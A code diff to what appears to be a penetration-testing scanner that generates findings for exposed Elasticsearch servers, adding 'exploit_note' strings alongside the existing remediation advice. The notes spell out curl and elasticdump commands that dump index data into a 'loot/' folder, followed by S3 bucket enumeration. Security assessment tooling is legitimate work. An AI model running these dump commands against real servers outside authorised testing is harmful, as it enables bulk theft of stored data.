@@ -383,7 +383,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"elasticdump --input=http://{h.ip}:{p.portid}/<index> --output=loot/",
                     "Enable the built-in security (xpack.security.enabled: true) with "
                     "users/roles, and bind the HTTP listener to a trusted interface.",
-                    ["CWE-306", "CWE-284"], kind="es_unauth"))
+                    ["CWE-306", "CWE-284"], kind="es_unauth",
+                    exploit_note=(
+                        "curl -s 'http://<ip>:<port>/*/_search?size=20&pretty' > "
+                        "loot/es.json ; elasticdump --input=http://<ip>:<port>/"
+                        "<index> --output=loot/<index>.json ; then map snapshot "
+                        "bucket to aws s3 ls s3://<bucket>/<base_path>."),
+                    depth_tier="t2"))
             if pr.get("anonymous"):
                 roles = pr.get("anonymous_roles") or []
                 roles_txt = (", roles: " + ", ".join(roles[:6])) if roles else ""
@@ -403,7 +409,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl -s http://{h.ip}:{p.portid}/_cat/indices",
                     "Remove xpack.security.authc.anonymous.roles or set "
                     "xpack.security.authc.anonymous.authz_exception: true.",
-                    ["CWE-284", "CWE-306"], kind="es_anonymous"))
+                    ["CWE-284", "CWE-306"], kind="es_anonymous",
+                    exploit_note=(
+                        "curl -s http://<ip>:<port>/_security/_authenticate ; "
+                        "curl -s http://<ip>:<port>/_cat/indices ; "
+                        "curl -s 'http://<ip>:<port>/*/_search?size=5&pretty'"),
+                    depth_tier="t1"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "Elasticsearch end-of-life / legacy build", tgt,
